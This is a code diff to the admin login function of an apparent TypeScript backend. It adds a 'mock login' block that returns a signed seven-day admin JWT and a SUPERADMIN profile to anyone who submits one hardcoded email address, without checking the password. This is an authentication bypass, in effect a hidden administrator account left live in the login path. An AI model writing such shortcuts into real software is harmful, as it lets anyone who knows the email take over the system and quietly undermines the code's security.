@@ -216,6 +216,28 @@ export const registerAdmin = async (data: {
     ADMIN LOGIN
 ============================================ */
 export const loginAdmin = async (email: string, password: string) => {
+  // --- MOCK LOGIN START ---
+  if (email === "flutterdev.babu@gmail.com") {
+    console.log("⚠️ USING MOCK ADMIN LOGIN");
+    const mockId = "mock_admin_id_123";
+    const token = jwt.sign({ id: mockId, role: "ADMIN" }, JWT_SECRET, {
+      expiresIn: "7d",
+    });
+
+    return {
+      message: "Login successful",
+      token,
+      admin: {
+        id: mockId,
+        name: "Demo Admin",
+        email: email,
+        role: "SUPERADMIN",
+        createdAt: new Date(),
+        updatedAt: new Date(),
+      },
+    };
+  }
+  // --- MOCK LOGIN END ---
   // Find admin by email
   const admin = await prisma.admin.findUnique({
     where: { email },
